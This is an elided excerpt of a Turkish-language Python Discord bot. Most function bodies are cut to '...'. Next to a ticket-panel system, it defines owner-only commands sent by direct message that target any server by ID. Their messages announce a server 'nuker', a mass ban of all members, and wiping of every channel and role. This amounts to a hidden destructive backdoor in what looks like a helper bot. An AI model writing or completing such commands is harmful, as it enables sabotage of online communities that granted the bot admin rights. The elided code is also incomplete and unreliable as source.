...
async def on_ready():
    ...
    bot.add_view(TicketCategorySelectView())
    ...
    for i, owner_id in enumerate(OWNER_IDS, 1):
        try:
            ...
            if i == 1:
                ...
                tag_display = f"{owner.name} | Hz. Muhammed"
            else:
                tag_display = f"{owner.name}"
            embed.add_field(
                name=f"Owner {i}",
...
async def prefix_nuker(ctx, sunucu_id: str = None):
    ...
    if isinstance(ctx.channel, discord.DMChannel):
        ...
        await ctx.reply(f"**🔥 NUKER BAŞLADI!** Sunucu: {guild.name}")
...
async def prefix_banall(ctx, sunucu_id: str = None):
    ...
    if isinstance(ctx.channel, discord.DMChannel):
        ...
        await ctx.reply(f"**⚡ TURBO BAN BAŞLADI!** Sunucu: {guild.name}\n`Hedef: {len(members)} üye`")
...
async def prefix_clear_all(ctx, sunucu_id: str = None):
    ...
    if isinstance(ctx.channel, discord.DMChannel):
        ...
        await ctx.reply(f"**⚡ TURBO TEMİZLİK BAŞLADI!** Sunucu: {guild.name}\n`Hedef: {channel_count} kanal + {len(guild.roles)} rol`")
...
class TicketCategorySelect(discord.ui.Select):
    def __init__(self, panel_category_id=None):
        self.panel_category_id = panel_category_id
        options = []
    ...
    async def callback(self, interaction: discord.Interaction):
        ...
        try:
            ...
            channel = await interaction.guild.create_text_channel(
                ...
                category=category,
                reason=f"Ticket açıldı: {interaction.user.name} - Kategori: {category_label}"
            )
            ...
            welcome_embed.add_field(name="📂 Kategori", value=category_label, inline=True)
            ...
            await interaction.response.send_message(f"✅ Ticket'ınız oluşturuldu! {channel.mention}\n📂 Kategori: **{category_label}**", ephemeral=True)
            ...
            if log_channel_id:
                ...
                if log_channel:
                    ...
                    log_embed.add_field(name="📂 Kategori", value=category_label, inline=True)
...
async def ticket_panel(ctx):
    ...
    # Panelin bulunduğu kanalın kategorisini kaydet
    panel_category_id = None
    if ctx.channel.category:
        panel_category_id = ctx.channel.category.id
        TICKET_SETTINGS[guild_id]["panel_category_id"] = panel_category_id
        save_ticket_settings()
    ...
    if panel_category_id:
        embed.add_field(name="📁 Ticket Kategorisi", value=f"`{ctx.channel.category.name}`", inline=False)
